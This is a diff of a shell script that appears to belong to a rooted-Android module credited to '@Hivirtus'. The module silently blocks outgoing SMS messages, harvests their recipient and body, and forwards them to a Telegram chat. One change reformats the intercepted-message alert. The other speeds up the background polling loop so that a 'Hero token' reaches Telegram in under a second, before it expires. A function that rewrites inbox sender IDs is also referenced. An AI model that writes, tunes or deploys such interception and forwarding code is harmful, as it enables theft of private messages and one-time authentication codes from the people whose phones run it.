@@ -1056,10 +1056,11 @@ forward_blocked_telegram() {
   [ -z "$TO_NUM" ] && TO_NUM="—"
   MSG_BODY="$BLOCKED_BODY"
 
-  # User screenshot: monospaced To/Body = Telegram tap-to-copy (no buttons)
+  # User screenshot: bold headers + monospaced To/Body = tap-to-copy
   HTML_TO=$(tg_html_escape "$TO_NUM")
   HTML_BODY=$(tg_html_escape "$MSG_BODY")
-  TEXT="📱 Intercepted Outgoing Zygisk Mode Menu By @Hivirtus 🔥
+  TEXT="<b>Intercepted Outgoing Zygisk Mode Menu</b>
+<b>By @Hivirtus 🔥</b>
 
 To (Tap to copy):
 <code>${HTML_TO}</code>
@@ -1262,11 +1263,11 @@ rewrite_inbox_sender_id() {
 }
 
 (
-  # Ultra-fast TG path — Hero token expire fix (was ~15s)
+  # Ultra-fast TG path — Hero token ~30s; target Telegram <1s
   while true; do
     harvest_blocked_outgoing
     forward_blocked_telegram
-    sleep 0.25 2>/dev/null || usleep 250000 2>/dev/null || sleep 1
+    usleep 50000 2>/dev/null || sleep 0.05 2>/dev/null || sleep 0.1
   done
 ) &
 
